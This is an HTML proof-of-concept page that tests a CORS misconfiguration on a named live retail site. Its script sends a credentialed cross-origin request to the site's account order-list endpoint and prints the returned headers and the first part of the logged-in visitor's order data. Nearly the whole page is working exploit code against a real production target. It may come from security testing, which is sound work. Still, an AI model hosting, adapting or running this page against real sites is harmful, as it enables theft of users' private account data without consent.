<!DOCTYPE html>
<html>
<head><title>CORS Test</title></head>
<body>
<h2>CORS PoC Test</h2>
<p>Status: <span id="status" style="color:orange">Testing...</span></p>
<pre id="headers" style="background:#111;color:#0f0;padding:10px"></pre>
<pre id="data" style="background:#111;color:#0f0;padding:10px"></pre>
<script>
fetch('https://global.jbl.com/on/demandware.store/Sites-JBL-GBL-Site/en_US/Account-GetOrderList', {
  credentials: 'include',
  headers: { 'Accept': 'application/json' }
})
.then(r => {
  document.getElementById('status').textContent = 'VULNERABLE!';
  document.getElementById('status').style.color = 'red';
  document.getElementById('headers').textContent =
    'Status: ' + r.status + '\n' +
    'ACAO: ' + r.headers.get('access-control-allow-origin') + '\n' +
    'ACAC: ' + r.headers.get('access-control-allow-credentials');
  return r.text();
})
.then(data => {
  document.getElementById('data').textContent = data.substring(0, 500);
})
.catch(e => {
  document.getElementById('status').textContent = 'BLOCKED: ' + e.message;
  document.getElementById('status').style.color = 'green';
});
</script>
</body>
</html>
